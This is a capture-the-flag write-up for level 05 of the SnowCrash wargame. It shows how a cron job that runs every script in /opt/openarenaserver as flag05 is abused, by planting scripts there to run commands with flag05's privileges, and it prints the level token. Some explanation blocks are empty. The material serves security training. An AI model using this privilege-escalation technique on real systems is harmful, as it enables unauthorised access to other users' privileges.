# LEVEL05

## 0. ?

```bash
> ssh -p 4243 level05@127.0.0.1
	   _____                      _____               _     
	  / ____|                    / ____|             | |    
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          10.0.2.15 
level05@127.0.0.1's password: 
You have new mail.
```

When connect via ssh to the VM, a hint in echo is printed:
```
You have new mail.
```

## 1. Inspect The Home Directory

```bash
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```
The home directory contains no directly exploitable files.
A broader search is required to locate potentially useful files.

## 2.a Find All The Files That Owned by `flag05`

```bash
level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

**Explanation:**
>- `find`				: command used to search for files.
>- `/`					: search starting point (root directory).
>- `-user flag05`		: filters results to only files owned by \`flag05\`.
>- `2>/dev/null`		: redirects error messages to \`/dev/null\` to avoid clutter from permission errors.

## 2.b Inspect The Files

```bash
ls -l /usr/sbin/openarenaserver /rofs/usr/sbin/openarenaserver 
-rwxr-x---  1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver /rofs/usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
cat: /rofs/usr/sbin/openarenaserver: Permission denied
```

The script iterates through `/opt/openarenaserver/` and executes each file found there.
However, it does not have the SUID bit set, meaning it will run with the privileges of the executing user rather than `flag05`.

## 2.c Try To Exploit

```bash
level05@SnowCrash:~$ cat << t > /opt/openarenaserver/id
> #!/bin/bash
> id
> t
level05@SnowCrash:~$ sh /usr/sbin/openarenaserver 
+ id
uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)
```

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it.
>- `sh`					: execute a script.
>- `id`					: gives id of the current user.


The `id` output confirms the privileges used at execution.

## 3.a Find All The Directory Name `mail`

```bash
level05@SnowCrash:~$ find / -type d -name mail 2>/dev/null
/var/mail
/rofs/var/mail
```

**Explanation:**
>- `find`				: command used to search for files.
>- `/`					: search starting point (root directory).
>- `-type d`			: search for directories only.
>- `-name mail`			: filters results to only files named \`mail\`.
>- `2>/dev/null`		: redirects error messages to \`/dev/null\` to avoid clutter from permission errors.

With the help of the hint found before, 2 directories can be found.

## 3.b Inspect The Mail Directory

```bash
level05@SnowCrash:~$ ls -l /var/mail/ /rofs/var/mail
/rofs/var/mail:
total 1
-rw-r--r-- 1 root mail 58 Mar 12  2016 level05

/var/mail/:
total 4
-rw-r--r--+ 1 root mail 58 Aug 15 11:47 level05
level05@SnowCrash:~$ cat /var/mail/level05 /rofs/var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

A crontab file is found, owned by `root`. It runs `/usr/sbin/openarenaserver` every two minutes as `flag05` (unlike ``/usr/sbin/openarenaserver` alone).
This crontab file run the `su -c "sh /usr/sbin/openarenaserver` every two minutes.

**Explanation:**
>- `*/2 * * * *`					: each * stand for un time `minute hour day month year`. 
>- `su`								: switches to another user. 
>- `-c`								: executes the following command.
>- `"sh /usr/sbin/openarenaserver"`	: executes the `/usr/sbin/openarenaserver` script.
>- `- flag05`						: runs this rule as `flag05`.

## 3.c Try To Exploit

```bash
level05@SnowCrash:~$ cat << EOF > /opt/openarenaserver/id
#!/bin/bash
id > /tmp/id
EOF
level05@SnowCrash:~$ crontab /var/mail/level05
level05@SnowCrash:~$ crontab -l
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
[waiting 2 minutes...]
level05@SnowCrash:~$ cat /tmp/id
uid=3005(flag05) gid=3005(flag05) groups=3005(flag05),1001(flag)
```

This try of exploit confirms executions with `flag05` privileges.

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it .
>- `crontab file`		: setup a new rules.
>- `crontab -l`			: list all the rules.
>- `id`					: print the uid and uig of the executing user.

## 4. Exploit Using `crontab`

```bash
level05@SnowCrash:~$ cat << EOF > /opt/openarenaserver/getflag
> #!/bin/bash
> getflag > /tmp/getflag
> EOF
level05@SnowCrash:~$ crontab /var/mail/level05
level05@SnowCrash:~$ crontab -l
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
[waiting 2 minutes...]
level05@SnowCrash:~$ cat /tmp/
level05@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Create a script `/opt/openarenaserver/getflag` that simply runs `getflag` and redirect the output in a `/tmp/getflag` file. This script will be run by `/usr/sbin/openarenaserver` now it's in `/opt/openarenaserver/`.

Setup `crontab` with `/var/mail/level05` to the script `level05` is runned by `crontab`.

Wait 2 minutes that the crontab take effect.

Then `cat` the content of `/tmp/getflag`.

**Explanation:**
>- `cat << EOF > file`	: creates a file and writes everything until `EOF` into it.
>- `crontab file`		: 
>- `crontab -l`			: 

## 5. As Information

When loggin directly from the VM and not in ssh, the message `You have new mail.` isn't printed.
But it's always possible to find the solution by search either all files containing `/usr/sbin/openarenaserver` or directly files names `level05`.

```bash
level05@SnowCrash:~$ find / -type f -exec grep -H "/usr/sbin/openarenaserver" {} + 2>/dev/null
Binary file /proc/27761/task/27761/cmdline matches
Binary file /proc/27761/cmdline matches
/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
/rofs/var/mail/level05:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

**Explanation:**
>-				:
>-				:
>-				:

```bash
level05@SnowCrash:~$ find / -type f -name level05  2>/dev/null
/var/mail/level05
/rofs/var/mail/level05
```

**Explanation:**
>-				:
>-				:
>-				:
